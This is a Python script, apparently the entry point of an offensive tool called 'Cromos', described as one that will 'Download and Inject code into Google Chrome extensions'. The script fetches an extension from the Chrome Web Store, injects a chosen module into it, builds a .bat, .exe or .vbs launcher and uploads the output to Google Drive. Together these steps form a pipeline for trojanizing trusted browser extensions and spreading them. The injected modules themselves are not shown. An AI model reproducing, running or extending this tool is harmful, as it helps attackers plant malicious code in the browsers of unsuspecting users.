#!/usr/bin/python

import argparse
from pyfiglet import Figlet
import sys
import libs.crx
from libs.crx import CRX
from libs.drive import Drive
from libs.build import Build
from libs.loader import Loader

from termcolor import colored, cprint


class backgroundColor:

    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def Flag() : 

	banner = """

         (         )      *         )    (     
   (     )\ )   ( /(    (  `     ( /(    )\ )  
   )\   (()/(   )\())   )\))(    )\())  (()/(  
 (((_)   /(_)) ((_)\   ((_)()\  ((_)\    /(_)) 
 )\___  (_))     ((_)  (_()((_)   ((_)  (_))   
((/ __| | _ \   / _ \  |  \/  |  / _ \  / __|  
 | (__  |   /  | (_) | | |\/| | | (_) | \__ \  
  \___| |_|_\   \___/  |_|  |_|  \___/  |___/\n
\033[1mVersion:\033[0m 1.0 \033[1mBuilds:\033[0m 3 \033[1mModules:\033[0m 2
 """
	print("{}".format(backgroundColor.WARNING + banner + backgroundColor.ENDC))

def optionsParser () :

	global extension, build, apikey, module

	parser = argparse.ArgumentParser(description="Download and Inject code into Google Chrome extensions", usage="python cromos.py --help")
	parser.add_argument('--extension', help="Download a extension from Google Chrome Webstore", type=str, default="", required=True)
	parser.add_argument('--load', help='Load a module to run in background with the application', type=str)
	parser.add_argument('--build', help='Build types .bat\n.exe\n.vbs', type=str)
	parser.add_argument('--key', help='API key for uploading files in Google Drive', type=str)

	args = parser.parse_args()

	extension = args.extension # Extensao ID
	build = args.build # Tipo do arquivo que devera ser gerado apos os injections
	apikey = args.key # API key par ao dropbox
	module = args.load # Pasta de saida para os arquivos

	if len(sys.argv) <= 2 :
		parser.print_help()
		

if __name__== "__main__" :

	Flag()
	optionsParser()

	application = CRX(extension)
	
	if application.valid():

		print(backgroundColor.OKGREEN + "[+]" + backgroundColor.ENDC + " Download the CRX {} ...".format(extension))
		application.download()

		# print("[+] Unpacking the CRX {} ...".format(extension))
		application.unpack()

		print(backgroundColor.OKGREEN + "[+]" + backgroundColor.ENDC + " Loading the module {}".format(module))
		loader = Loader(module).inject()

		print(backgroundColor.OKGREEN + "[+]" + backgroundColor.ENDC + " Creating executable file in output/builds/{}.bat ...".format(extension))
		build = Build(extension).Builder()
		
		# print("[+] Extract the zip file {} ...".format(extension))
		application.extract()
		print(backgroundColor.WARNING + "[!]" + backgroundColor.ENDC +  " Extension directory output/extension/{}".format(extension))

		print(backgroundColor.OKGREEN + "[+]" + backgroundColor.ENDC + " Upload files in the Google Drive ...")
		drive = Drive(extension, apikey)
		print(backgroundColor.OKGREEN + "[+]" + backgroundColor.ENDC + " Well, it's okay! ") 